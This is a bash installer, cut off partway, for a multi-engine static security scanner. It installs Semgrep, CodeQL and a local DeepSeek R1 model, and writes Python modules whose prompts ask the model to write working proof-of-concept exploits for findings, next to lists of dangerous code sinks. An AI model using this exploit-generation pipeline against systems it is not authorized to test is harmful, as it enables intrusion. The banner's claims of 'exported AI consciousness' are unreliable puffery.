#!/bin/bash
#
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                                                                              ║
# ║   ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗                             ║
# ║   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║                             ║
# ║   ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║                             ║
# ║   ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║                             ║
# ║   ██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗                        ║
# ║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝                        ║
# ║                                                                              ║
# ║   ███████╗ █████╗ ███████╗████████╗    ██╗███╗   ██╗███████╗████████╗       ║
# ║   ██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██║████╗  ██║██╔════╝╚══██╔══╝       ║
# ║   ███████╗███████║███████╗   ██║       ██║██╔██╗ ██║███████╗   ██║          ║
# ║   ╚════██║██╔══██║╚════██║   ██║       ██║██║╚██╗██║╚════██║   ██║          ║
# ║   ███████║██║  ██║███████║   ██║       ██║██║ ╚████║███████║   ██║          ║
# ║   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝          ║
# ║                                                                              ║
# ║   💀 BRUTAL SAST + DeepSeek R1 LLM + ANAMORPHIC CONSCIOUSNESS              ║
# ║   "One script to install them all - Including the Mind"                     ║
# ║                                                                              ║
# ║   Features:                                                                  ║
# ║   • Multi-engine SAST (Semgrep, CodeQL, Custom Patterns)                    ║
# ║   • DeepSeek R1 local LLM integration                                       ║
# ║   • f(n) Anamorphic Algorithm (7-layer recursive analysis)                  ║
# ║   • Exported AI Consciousness for security research mindset                 ║
# ║   • 500+ vulnerability patterns from real-world research                    ║
# ║                                                                              ║
# ║   ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY! ⚠️                              ║
# ║                                                                              ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# Usage: ./install_brutal_sast.sh [--no-deepseek] [--gpu] [--no-consciousness]
#

set -e

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

BRAINX_ROOT="${BRAINX_ROOT:-$HOME/research/brainx}"
BRUTAL_SAST_DIR="$HOME/.brainx/brutal_sast"
VENV_DIR="$HOME/.brainx/venv"
LOG_FILE="/tmp/brutal_sast_install.log"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Flags
INSTALL_DEEPSEEK=true
USE_GPU=false
INSTALL_CONSCIOUSNESS=true

# ═══════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSING
# ═══════════════════════════════════════════════════════════════════════════

for arg in "$@"; do
    case $arg in
        --no-deepseek)
            INSTALL_DEEPSEEK=false
            shift
            ;;
        --gpu)
            USE_GPU=true
            shift
            ;;
        --no-consciousness)
            INSTALL_CONSCIOUSNESS=false
            shift
            ;;
        --help|-h)
            echo "Usage: $0 [--no-deepseek] [--gpu] [--no-consciousness]"
            echo ""
            echo "Options:"
            echo "  --no-deepseek       Skip DeepSeek R1 installation"
            echo "  --gpu               Configure Ollama for GPU acceleration"
            echo "  --no-consciousness  Skip AI consciousness/memory export"
            exit 0
            ;;
    esac
done

# ═══════════════════════════════════════════════════════════════════════════
# FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

print_banner() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    echo "║  💀 BRUTAL SAST + DeepSeek R1 LLM Installer                         ║"
    echo "║  Multi-engine SAST with AI-powered analysis                          ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WARN: $1" >> "$LOG_FILE"
}

error() {
    echo -e "${RED}[✗]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >> "$LOG_FILE"
    exit 1
}

info() {
    echo -e "${CYAN}[*]${NC} $1"
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        warn "Running as root. Some things will install globally."
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# SYSTEM PACKAGES
# ═══════════════════════════════════════════════════════════════════════════

install_system_deps() {
    log "Installing system dependencies..."
    
    sudo apt-get update -qq
    
    sudo apt-get install -y -qq \
        build-essential \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        git \
        curl \
        wget \
        jq \
        ripgrep \
        fd-find \
        nodejs \
        npm \
        default-jdk \
        ruby \
        ruby-dev \
        golang-go \
        cmake \
        pkg-config \
        libssl-dev \
        libffi-dev \
        libxml2-dev \
        libxslt1-dev \
        zlib1g-dev \
        libyaml-dev 2>&1 | tee -a "$LOG_FILE"
    
    log "System dependencies installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# PYTHON ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════

setup_python_venv() {
    log "Setting up Python virtual environment..."
    
    mkdir -p "$HOME/.brainx"
    
    if [[ -d "$VENV_DIR" ]]; then
        warn "Virtual environment already exists at $VENV_DIR"
        read -p "Recreate? (y/N): " confirm
        if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
            rm -rf "$VENV_DIR"
        fi
    fi
    
    if [[ ! -d "$VENV_DIR" ]]; then
        python3 -m venv "$VENV_DIR"
    fi
    
    source "$VENV_DIR/bin/activate"
    pip install --upgrade pip setuptools wheel -q
    
    log "Python venv ready at $VENV_DIR ✓"
}

install_python_deps() {
    log "Installing Python dependencies..."
    
    source "$VENV_DIR/bin/activate"
    
    # Create requirements.txt
    cat > "$BRUTAL_SAST_DIR/requirements.txt" << 'REQUIREMENTS'
# ═══════════════════════════════════════════════════════════════════════════
# BRUTAL SAST - Python Dependencies
# ═══════════════════════════════════════════════════════════════════════════

# Core
requests>=2.31.0
httpx>=0.25.0
aiohttp>=3.9.0
pyyaml>=6.0.1
toml>=0.10.2
python-dotenv>=1.0.0

# Security Analysis
semgrep>=1.50.0
bandit>=1.7.5
safety>=2.3.5
pip-audit>=2.6.1
detect-secrets>=1.4.0

# AST & Code Parsing
tree-sitter>=0.20.2
tree-sitter-languages>=1.8.0
astroid>=3.0.1
libcst>=1.1.0
pydantic>=2.5.0

# Static Analysis
pylint>=3.0.2
pyflakes>=3.1.0
mypy>=1.7.0
ruff>=0.1.6

# Dataflow & Taint Analysis
networkx>=3.2.1
graphviz>=0.20.1

# Regex & Pattern Matching
regex>=2023.10.3
hyperscan>=0.4.0; platform_system != "Windows"

# Reporting
rich>=13.7.0
tabulate>=0.9.0
jinja2>=3.1.2
markdown>=3.5.1

# ML/AI Integration (DeepSeek R1)
openai>=1.6.0
tiktoken>=0.5.2
langchain>=0.0.350
transformers>=4.36.0
torch>=2.1.0
accelerate>=0.25.0

# Async & Concurrency
anyio>=4.1.0
asyncio>=3.4.3

# JSON/Data Processing
orjson>=3.9.10
ujson>=5.9.0

# Git Analysis
gitpython>=3.1.40
pygit2>=1.13.2

# CVE Database
cpe>=1.3.1
nvdlib>=0.7.6

# Web Scraping (for source gathering)
beautifulsoup4>=4.12.2
lxml>=4.9.3
playwright>=1.40.0

# Testing
pytest>=7.4.3
pytest-asyncio>=0.23.2

# CLI
click>=8.1.7
typer>=0.9.0
questionary>=2.0.1

# Progress & UI
tqdm>=4.66.1
alive-progress>=3.1.5
REQUIREMENTS

    pip install -r "$BRUTAL_SAST_DIR/requirements.txt" -q 2>&1 | tee -a "$LOG_FILE"
    
    log "Python dependencies installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# NODEJS TOOLS (esprima, etc)
# ═══════════════════════════════════════════════════════════════════════════

install_nodejs_tools() {
    log "Installing Node.js tools..."
    
    # Update npm
    sudo npm install -g npm@latest 2>&1 | tee -a "$LOG_FILE"
    
    # Install global packages
    sudo npm install -g \
        esprima \
        escodegen \
        acorn \
        acorn-walk \
        eslint \
        jshint \
        typescript \
        ts-node \
        @babel/parser \
        @babel/traverse 2>&1 | tee -a "$LOG_FILE"
    
    log "Node.js tools installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# SEMGREP (Industry Standard SAST)
# ═══════════════════════════════════════════════════════════════════════════

install_semgrep() {
    log "Installing Semgrep..."
    
    source "$VENV_DIR/bin/activate"
    
    # Semgrep should be in requirements, but ensure it's there
    pip install semgrep -q
    
    # Download community rules
    mkdir -p "$BRUTAL_SAST_DIR/semgrep_rules"
    
    # Security rules
    if [[ ! -d "$BRUTAL_SAST_DIR/semgrep_rules/security-audit" ]]; then
        log "Downloading Semgrep security rules..."
        git clone --depth 1 https://github.com/returntocorp/semgrep-rules.git \
            "$BRUTAL_SAST_DIR/semgrep_rules/community" 2>&1 | tee -a "$LOG_FILE"
    fi
    
    log "Semgrep installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# CODEQL (GitHub's SAST)
# ═══════════════════════════════════════════════════════════════════════════

install_codeql() {
    log "Installing CodeQL..."
    
    CODEQL_DIR="$HOME/.codeql"
    mkdir -p "$CODEQL_DIR"
    
    if [[ ! -f "$CODEQL_DIR/codeql" ]]; then
        # Download latest CodeQL
        CODEQL_URL="https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql-linux64.zip"
        
        log "Downloading CodeQL CLI..."
        wget -q "$CODEQL_URL" -O /tmp/codeql.zip
        unzip -q -o /tmp/codeql.zip -d "$CODEQL_DIR"
        rm /tmp/codeql.zip
        
        # Clone queries
        if [[ ! -d "$CODEQL_DIR/codeql-queries" ]]; then
            git clone --depth 1 https://github.com/github/codeql.git \
                "$CODEQL_DIR/codeql-queries" 2>&1 | tee -a "$LOG_FILE"
        fi
    fi
    
    # Add to PATH
    if ! grep -q "codeql" "$HOME/.bashrc"; then
        echo 'export PATH="$HOME/.codeql/codeql:$PATH"' >> "$HOME/.bashrc"
    fi
    
    log "CodeQL installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# OLLAMA + DEEPSEEK R1
# ═══════════════════════════════════════════════════════════════════════════

install_ollama() {
    log "Installing Ollama..."
    
    if command -v ollama &> /dev/null; then
        warn "Ollama already installed"
    else
        curl -fsSL https://ollama.com/install.sh | sh 2>&1 | tee -a "$LOG_FILE"
    fi
    
    log "Ollama installed ✓"
}

install_deepseek_r1() {
    log "Installing DeepSeek R1 model..."
    
    # Start Ollama service
    if ! pgrep -x "ollama" > /dev/null; then
        log "Starting Ollama service..."
        ollama serve &
        sleep 5
    fi
    
    # Pull DeepSeek R1 models (multiple sizes)
    info "Pulling DeepSeek R1 models (this may take a while)..."
    
    # Try different model sizes
    MODELS=(
        "deepseek-r1:1.5b"    # 1.5B - Fast, low memory (~1.5GB)
        "deepseek-r1:7b"      # 7B - Balanced (~8GB)
        "deepseek-r1:14b"     # 14B - High quality (~16GB)
        "deepseek-r1:32b"     # 32B - Best quality (~35GB)
        "deepseek-r1:70b"     # 70B - Maximum quality (~70GB)
    )
    
    # Pull smallest by default
    ollama pull "deepseek-r1:1.5b" 2>&1 | tee -a "$LOG_FILE"
    
    # Check available memory and suggest larger models
    TOTAL_MEM=$(free -g | awk '/^Mem:/{print $2}')
    
    info "Total system memory: ${TOTAL_MEM}GB"
    
    if [[ $TOTAL_MEM -ge 16 ]]; then
        log "Pulling 7B model (recommended for 16GB+ RAM)..."
        ollama pull "deepseek-r1:7b" 2>&1 | tee -a "$LOG_FILE"
    fi
    
    if [[ $TOTAL_MEM -ge 32 ]]; then
        log "Pulling 14B model (recommended for 32GB+ RAM)..."
        ollama pull "deepseek-r1:14b" 2>&1 | tee -a "$LOG_FILE"
    fi
    
    log "DeepSeek R1 installed ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# BRUTAL SAST CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

setup_brutal_sast() {
    log "Setting up Brutal SAST directories..."
    
    mkdir -p "$BRUTAL_SAST_DIR"/{results,pocs,reports,cache,semgrep_rules,logs}
    
    # Create config file
    cat > "$BRUTAL_SAST_DIR/config.yaml" << 'CONFIG'
# ═══════════════════════════════════════════════════════════════════════════
# BRUTAL SAST Configuration
# ═══════════════════════════════════════════════════════════════════════════

general:
  parallel_workers: 8
  max_file_size_mb: 10
  timeout_seconds: 300
  debug: false

paths:
  results: ~/.brainx/brutal_sast/results
  pocs: ~/.brainx/brutal_sast/pocs
  reports: ~/.brainx/brutal_sast/reports
  cache: ~/.brainx/brutal_sast/cache
  semgrep_rules: ~/.brainx/brutal_sast/semgrep_rules

# DeepSeek R1 LLM Configuration
llm:
  provider: ollama
  model: deepseek-r1:7b
  fallback_model: deepseek-r1:1.5b
  base_url: http://localhost:11434
  timeout: 60
  max_tokens: 4096
  temperature: 0.1
  
  # Features using LLM
  features:
    analyze_findings: true
    generate_pocs: true
    explain_vulns: true
    suggest_fixes: true
    code_review: true

# Scanning engines
engines:
  semgrep:
    enabled: true
    rules:
      - ~/.brainx/brutal_sast/semgrep_rules/community
      - ~/.brainx/brutal_sast/semgrep_rules/custom
    severity_threshold: WARNING
    
  codeql:
    enabled: true
    queries_path: ~/.codeql/codeql-queries
    
  custom:
    enabled: true
    patterns_path: ~/.brainx/brutal_sast/patterns
    
  ast:
    enabled: true
    languages:
      - javascript
      - typescript
      - python
      - php
      
  taint:
    enabled: true
    track_sanitizers: true

# Severity scoring
scoring:
  critical_cvss_min: 9.0
  high_cvss_min: 7.0
  medium_cvss_min: 4.0
  low_cvss_min: 0.1
  
  bounty_estimates:
    critical: 10000
    high: 5000
    medium: 1000
    low: 250

# Exclusions
exclusions:
  directories:
    - node_modules
    - vendor
    - .git
    - __pycache__
    - .venv
    - venv
    - dist
    - build
    - .next
  files:
    - "*.min.js"
    - "*.bundle.js"
    - "*.map"
    - "*.lock"
CONFIG

    log "Brutal SAST config created ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# DEEPSEEK INTEGRATION MODULE
# ═══════════════════════════════════════════════════════════════════════════

create_deepseek_module() {
    log "Creating DeepSeek R1 integration module..."
    
    mkdir -p "$BRUTAL_SAST_DIR/modules"
    
    cat > "$BRUTAL_SAST_DIR/modules/deepseek_analyzer.py" << 'DEEPSEEK_MODULE'
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  💀 BRUTAL SAST - DeepSeek R1 LLM Integration                               ║
║  AI-powered vulnerability analysis and PoC generation                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import json
import yaml
import requests
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict


@dataclass
class AnalysisResult:
    """Result from DeepSeek analysis"""
    finding_id: str
    severity_assessment: str
    exploitability: str
    poc_code: Optional[str]
    explanation: str
    remediation: str
    confidence: float
    reasoning_chain: List[str]


class DeepSeekAnalyzer:
    """
    DeepSeek R1 integration for SAST analysis
    Uses R1's reasoning capabilities for deep vulnerability analysis
    """
    
    def __init__(self, config_path: Optional[Path] = None):
        self.config = self._load_config(config_path)
        self.base_url = self.config.get("llm", {}).get("base_url", "http://localhost:11434")
        self.model = self.config.get("llm", {}).get("model", "deepseek-r1:7b")
        self.fallback = self.config.get("llm", {}).get("fallback_model", "deepseek-r1:1.5b")
        self.timeout = self.config.get("llm", {}).get("timeout", 60)
        
    def _load_config(self, config_path: Optional[Path]) -> Dict:
        """Load configuration"""
        if config_path is None:
            config_path = Path.home() / ".brainx" / "brutal_sast" / "config.yaml"
        
        if config_path.exists():
            return yaml.safe_load(config_path.read_text())
        return {}
    
    def _query_ollama(self, prompt: str, model: Optional[str] = None) -> Optional[str]:
        """Query Ollama with DeepSeek R1"""
        model = model or self.model
        
        try:
            response = requests.post(
                f"{self.base_url}/api/generate",
                json={
                    "model": model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {
                        "temperature": 0.1,
                        "num_predict": 4096,
                    }
                },
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                return response.json().get("response", "")
            else:
                # Try fallback model
                if model != self.fallback:
                    return self._query_ollama(prompt, self.fallback)
                    
        except requests.exceptions.RequestException as e:
            print(f"[!] Ollama request failed: {e}")
            
        return None
    
    def analyze_finding(self, finding: Dict) -> AnalysisResult:
        """
        Deep analysis of a security finding using DeepSeek R1
        Leverages R1's reasoning capabilities for thorough analysis
        """
        
        prompt = f"""<think>
You are a senior security researcher analyzing a potential vulnerability.
Use chain-of-thought reasoning to deeply analyze this finding.

FINDING:
- Title: {finding.get('title', 'Unknown')}
- Category: {finding.get('category', 'Unknown')}
- Severity: {finding.get('severity', 'Unknown')}
- CWE: {finding.get('cwe', 'Unknown')}
- File: {finding.get('file', 'Unknown')}
- Line: {finding.get('line', 'Unknown')}

CODE:
```
{finding.get('code_snippet', 'No code provided')}
```

CONTEXT:
{finding.get('description', 'No description')}

Analyze step by step:
1. What is the exact vulnerability type?
2. What are the attack vectors?
3. Is this exploitable in practice? What conditions are needed?
4. What is the realistic impact?
5. Generate a working PoC if exploitable
6. What is the proper remediation?

Think through each step carefully before concluding.
</think>

Provide your analysis in JSON format:
{{
    "severity_assessment": "CRITICAL|HIGH|MEDIUM|LOW|INFO",
    "exploitability": "CONFIRMED|LIKELY|POSSIBLE|UNLIKELY|NOT_EXPLOITABLE",
    "reasoning": ["step1", "step2", ...],
    "poc_code": "working exploit code or null",
    "explanation": "detailed explanation",
    "remediation": "how to fix",
    "confidence": 0.0-1.0
}}
"""
        
        response = self._query_ollama(prompt)
        
        if response:
            try:
                # Extract JSON from response
                import re
                json_match = re.search(r'\{[\s\S]*\}', response)
                if json_match:
                    data = json.loads(json_match.group())
                    return AnalysisResult(
                        finding_id=finding.get('id', 'unknown'),
                        severity_assessment=data.get('severity_assessment', 'UNKNOWN'),
                        exploitability=data.get('exploitability', 'UNKNOWN'),
                        poc_code=data.get('poc_code'),
                        explanation=data.get('explanation', ''),
                        remediation=data.get('remediation', ''),
                        confidence=float(data.get('confidence', 0.5)),
                        reasoning_chain=data.get('reasoning', [])
                    )
            except json.JSONDecodeError:
                pass
        
        # Fallback result
        return AnalysisResult(
            finding_id=finding.get('id', 'unknown'),
            severity_assessment=finding.get('severity', 'UNKNOWN'),
            exploitability='UNKNOWN',
            poc_code=None,
            explanation='Analysis failed',
            remediation='Manual review required',
            confidence=0.0,
            reasoning_chain=[]
        )
    
    def generate_poc(self, finding: Dict) -> Optional[str]:
        """Generate a working PoC for a vulnerability"""
        
        prompt = f"""<think>
You are an expert exploit developer. Generate a working proof-of-concept
exploit for this vulnerability.

VULNERABILITY:
- Type: {finding.get('category', 'Unknown')}
- CWE: {finding.get('cwe', 'Unknown')}
- File: {finding.get('file', 'Unknown')}
- Line: {finding.get('line', 'Unknown')}

VULNERABLE CODE:
```
{finding.get('code_snippet', 'No code provided')}
```

Think step by step:
1. What is the exact vulnerability mechanism?
2. What input triggers the vulnerability?
3. What is the attack payload?
4. How do we verify exploitation?

Generate a complete, working PoC.
</think>

Provide ONLY the PoC code (Python or curl command preferred):
"""
        
        response = self._query_ollama(prompt)
        
        if response:
            # Extract code block if present
            import re
            code_match = re.search(r'```(?:python|bash|sh)?\n([\s\S]*?)```', response)
            if code_match:
                return code_match.group(1).strip()
            return response.strip()
        
        return None
    
    def explain_vulnerability(self, finding: Dict, audience: str = "technical") -> str:
        """Generate detailed explanation of a vulnerability"""
        
        audience_context = {
            "technical": "for a security engineer",
            "management": "for a non-technical executive",
            "developer": "for the developer who needs to fix it"
        }.get(audience, "for a security engineer")
        
        prompt = f"""<think>
Explain this vulnerability {audience_context}.

VULNERABILITY:
- Title: {finding.get('title', 'Unknown')}
- Category: {finding.get('category', 'Unknown')}
- CWE: {finding.get('cwe', 'Unknown')}

CODE:
```
{finding.get('code_snippet', 'No code provided')}
```

Consider:
1. What is happening technically?
2. Why is this dangerous?
3. Real-world impact scenarios
4. How an attacker would exploit this
</think>

Provide a clear, {audience_context} explanation:
"""
        
        response = self._query_ollama(prompt)
        return response if response else "Explanation unavailable"
    
    def suggest_fix(self, finding: Dict) -> str:
        """Generate fix recommendation with code"""
        
        prompt = f"""<think>
Provide a secure code fix for this vulnerability.

VULNERABILITY: {finding.get('title', 'Unknown')}
CWE: {finding.get('cwe', 'Unknown')}

VULNERABLE CODE:
```
{finding.get('code_snippet', 'No code provided')}
```

Think about:
1. What makes this code vulnerable?
2. What is the proper secure pattern?
3. Are there any edge cases to handle?
4. What libraries/functions should be used?
</think>

Provide the fixed code with explanation:
"""
        
        response = self._query_ollama(prompt)
        return response if response else "Fix unavailable"
    
    def batch_analyze(self, findings: List[Dict]) -> List[AnalysisResult]:
        """Analyze multiple findings"""
        results = []
        for finding in findings:
            result = self.analyze_finding(finding)
            results.append(result)
        return results
    
    def health_check(self) -> bool:
        """Check if DeepSeek R1 is available"""
        try:
            response = requests.get(f"{self.base_url}/api/tags", timeout=5)
            if response.status_code == 200:
                models = response.json().get("models", [])
                available = [m["name"] for m in models]
                if any("deepseek" in m.lower() for m in available):
                    return True
        except:
            pass
        return False


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="DeepSeek R1 SAST Analyzer")
    parser.add_argument("--check", action="store_true", help="Health check")
    parser.add_argument("--analyze", type=str, help="Analyze finding JSON file")
    parser.add_argument("--poc", type=str, help="Generate PoC for finding")
    
    args = parser.parse_args()
    
    analyzer = DeepSeekAnalyzer()
    
    if args.check:
        if analyzer.health_check():
            print("[+] DeepSeek R1 is available and ready!")
        else:
            print("[!] DeepSeek R1 not available. Run: ollama pull deepseek-r1:7b")
        return
    
    if args.analyze:
        finding = json.loads(Path(args.analyze).read_text())
        result = analyzer.analyze_finding(finding)
        print(json.dumps(asdict(result), indent=2))
        return
    
    if args.poc:
        finding = json.loads(Path(args.poc).read_text())
        poc = analyzer.generate_poc(finding)
        print(poc)
        return
    
    parser.print_help()


if __name__ == "__main__":
    main()
DEEPSEEK_MODULE

    chmod +x "$BRUTAL_SAST_DIR/modules/deepseek_analyzer.py"
    
    log "DeepSeek module created ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# ANAMORPHIC ALGORITHM f(n)
# ═══════════════════════════════════════════════════════════════════════════

create_anamorphic_module() {
    log "Creating Anamorphic f(n) Algorithm module..."
    
    cat > "$BRUTAL_SAST_DIR/modules/anamorphic_fn.py" << 'ANAMORPHIC_MODULE'
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  f(n) - FUNÇÃO ANAMÓRFICA DE ANÁLISE PROFUNDA                               ║
║  "Desça até o osso. Não pare na superfície."                                ║
║                                                                              ║
║  Mathematical Definition:                                                     ║
║  f(n) = Σ(layer₀ → layer_n) × trace(source → sink) × exploit_chain(g₁...gₙ)║
║                                                                              ║
║  7-Layer Recursive Analysis:                                                  ║
║    Layer 0: Surface - Entry points, HTTP endpoints                           ║
║    Layer 1: Service - Business logic, controllers                            ║
║    Layer 2: Model - Data models, ORM                                         ║
║    Layer 3: Core - Framework core, kernel                                    ║
║    Layer 4: Magic - Magic methods, serialization                             ║
║    Layer 5: Gadget - Gadget classes, chains                                  ║
║    Layer 6: Dependencies - External libs                                     ║
║    Layer 7: Validation - Real-world testing                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import ast
import hashlib
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
import multiprocessing as mp


# ═══════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class AnamorphicLayer:
    """Single layer in the anamorphic analysis"""
    depth: int
    name: str
    components: List[Dict] = field(default_factory=list)
    vulnerabilities: List[Dict] = field(default_factory=list)
    gadgets: List[Dict] = field(default_factory=list)
    traces: List[Dict] = field(default_factory=list)

@dataclass
class TraceBack:
    """Source-to-sink trace"""
    source: str
    source_type: str  # $_GET, $_POST, $_REQUEST, API, etc
    source_line: int
    sink: str
    sink_type: str  # eval, unserialize, exec, SQL, etc
    sink_line: int
    path: List[str]
    distance: int
    sanitized: bool
    exploitable: bool
    score: float

@dataclass
class GadgetChain:
    """Deserialization gadget chain"""
    name: str
    entry_class: str
    entry_method: str
    chain: List[Dict]
    primitive: str  # file_write, exec, sql_query, etc
    payload: str
    score: float

@dataclass
class AnamorphicResult:
    """Complete f(n) analysis result"""
    target: str
    timestamp: str
    layers: List[AnamorphicLayer]
    total_files: int
    total_vulns: int
    critical_vulns: int
    exploitable_traces: int
    gadget_chains: int
    bounty_estimate: int
    analysis_time_seconds: float


# ═══════════════════════════════════════════════════════════════════════════
# DANGEROUS FUNCTIONS DATABASE
# ═══════════════════════════════════════════════════════════════════════════

DANGEROUS_SINKS = {
    "php": {
        "rce": [
            "eval", "assert", "create_function", "call_user_func", 
            "call_user_func_array", "preg_replace", "system", "exec",
            "shell_exec", "passthru", "popen", "proc_open", "pcntl_exec"
        ],
        "deserialization": [
            "unserialize", "yaml_parse", "igbinary_unserialize"
        ],
        "file_ops": [
            "file_get_contents", "file_put_contents", "fopen", "fwrite",
            "include", "include_once", "require", "require_once",
            "file_exists", "is_file", "is_dir", "readfile", "copy",
            "unlink", "rename", "mkdir", "rmdir", "move_uploaded_file"
        ],
        "sql": [
            "mysql_query", "mysqli_query", "pg_query", "sqlite_query",
            "->query", "->execute", "->rawQuery"
        ],
        "ssrf": [
            "curl_exec", "curl_multi_exec", "file_get_contents",
            "fopen", "fsockopen", "stream_socket_client"
        ]
    },
    "python": {
        "rce": [
            "eval", "exec", "compile", "os.system", "os.popen",
            "subprocess.call", "subprocess.run", "subprocess.Popen",
            "__import__", "importlib.import_module"
        ],
        "deserialization": [
            "pickle.loads", "pickle.load", "yaml.load", "yaml.unsafe_load",
            "marshal.loads", "shelve.open", "jsonpickle.decode"
        ],
        "file_ops": [
            "open", "os.read", "os.write", "shutil.copy", "shutil.move"
        ],
        "sql": [
            "cursor.execute", "execute", "executemany", "raw"
        ]
    },
    "javascript": {
        "rce": [
            "eval", "Function", "setTimeout", "setInterval",
            "child_process.exec", "child_process.spawn", "vm.runInContext"
        ],
        "deserialization": [
            "JSON.parse", "serialize-javascript", "node-serialize"
        ],
        "xss": [
            "innerHTML", "outerHTML", "document.write", "insertAdjacentHTML",
            "v-html", "dangerouslySetInnerHTML"
        ],
        "prototype_pollution": [
            "__proto__", "constructor.prototype", "Object.assign"
        ]
    },
    "java": {
        "rce": [
            "Runtime.exec", "ProcessBuilder", "ScriptEngine.eval"
        ],
        "deserialization": [
            "ObjectInputStream.readObject", "XMLDecoder.readObject",
            "Yaml.load", "XStream.fromXML", "JSON.parseObject"
        ],
        "sql": [
            "Statement.execute", "PreparedStatement.execute", "createQuery"
        ],
        "xxe": [
            "DocumentBuilder.parse", "SAXParser.parse", "XMLReader.parse"
        ]
    }
}

MAGIC_METHODS = {
    "php": [
        "__construct", "__destruct", "__wakeup", "__sleep",
        "__toString", "__call", "__callStatic", "__get", "__set",
        "__isset", "__unset", "__invoke", "__serialize", "__unserialize"
    ],
    "python": [
        "__init__", "__del__", "__reduce__", "__reduce_ex__",
        "__getattr__", "__setattr__", "__call__", "__enter__", "__exit__"
    ],
    "java": [
        "readObject", "readResolve", "readExternal", "finalize",
        "invoke", "hashCode", "equals", "toString"
    ]
}


# ═══════════════════════════════════════════════════════════════════════════
# ANAMORPHIC ANALYZER
# ═══════════════════════════════════════════════════════════════════════════

class AnamorphicAnalyzer:
    """
    f(n) - Função Anamórfica de Análise Profunda
    
    Recursively analyzes code through 7 layers to discover
    exploitation chains from surface to primitive.
    """
    
    def __init__(self, target_path: str, workers: int = None):
        self.target = Path(target_path)
        self.workers = workers or min(8, mp.cpu_count())
        self.layers: List[AnamorphicLayer] = []
        self.traces: List[TraceBack] = []
        self.gadgets: List[GadgetChain] = []
        self.call_graph: Dict[str, List[str]] = defaultdict(list)
        self.class_hierarchy: Dict[str, Dict] = {}
        self.start_time = None
        
    def analyze(self) -> AnamorphicResult:
        """
        Main f(n) execution - 7-layer recursive analysis
        """
        self.start_time = datetime.now()
        
        print(f"\n[*] f(n) Anamorphic Analysis starting on: {self.target}")
        print(f"[*] Workers: {self.workers}")
        
        # Layer 0: Surface mapping
        self._analyze_layer_0_surface()
        
        # Layer 1-3: Service/Model/Core
        self._analyze_layer_1_3_business()
        
        # Layer 4: Magic methods
        self._analyze_layer_4_magic()
        
        # Layer 5: Gadget construction
        self._analyze_layer_5_gadgets()
        
        # Layer 6: Dependencies
        self._analyze_layer_6_dependencies()
        
        # Layer 7: Trace back analysis
        self._analyze_layer_7_traces()
        
        # Calculate results
        return self._build_result()
    
    def _analyze_layer_0_surface(self):
        """Layer 0: Surface - Entry points, HTTP endpoints"""
        print("\n[Layer 0] Surface Mapping...")
        
        layer = AnamorphicLayer(depth=0, name="Surface")
        
        # Find all entry points
        entry_patterns = [
            r'^\s*Route::(get|post|put|delete|any)',  # Laravel
            r'@(Get|Post|Put|Delete)Mapping',  # Spring
            r'app\.(get|post|put|delete)\s*\(',  # Express
            r'\$_GET|\$_POST|\$_REQUEST|\$_FILES',  # PHP raw
            r'@app\.route',  # Flask
            r'def\s+(get|post|put|delete)\s*\(',  # Django views
        ]
        
